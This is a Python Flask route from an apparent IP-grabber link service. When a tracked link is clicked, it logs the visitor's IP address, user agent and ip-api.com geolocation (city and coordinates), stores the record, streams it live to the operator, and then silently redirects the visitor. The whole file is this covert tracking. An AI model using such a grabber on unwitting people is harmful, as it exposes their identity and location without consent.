import requests
from datetime import datetime
from flask import Flask, request, redirect, Blueprint

logger = Blueprint('logger', __name__, template_folder="templates")

@logger.route('/<id>')
def first_grab(id):
    from .models import Links, Data
    args = list(request.args.items())
    id = id.split(".")[0]
    if len(args) != 0:
        id = args[0][1].split(".")[0]

    if Links.objects(url_code=id).first() != None:
        from app import socket

        if request.headers.getlist("X-Forwarded-For"):
            ip = request.headers.getlist("X-Forwarded-For")[0]
        else:
            ip = request.remote_addr

        if "," in ip:
            ip = ip.split(',')[0]
        uagent = request.headers.get('User-Agent')

        req = requests.get('http://ip-api.com/json/' + ip).json()
        if req['status'] == 'fail':
            country = "Fail"
        else:    
            country = req['country'] + ", " + req['city']

        time = datetime.now().strftime("%y-%m-%d %I:%M:%S")
        try:
            lat = req['lat']
            lon = req['lon']
        except:
            lat = 0
            lon = 0
        data = Data(ip=ip, useragent=uagent, country=country, datetime=time, lat=lat, lon=lon)

        link = Links.objects(url_code=id).first()
        redirect_url = link.redirect_url
        link.grab_info.append(data)
        link.save()

        socket.emit("new_grab", {"ip": ip, "useragent": uagent, "country": country, "datetime": time, "lat": lat, "lon": lon})

        return redirect(redirect_url)
    return redirect("https://yoink.rip")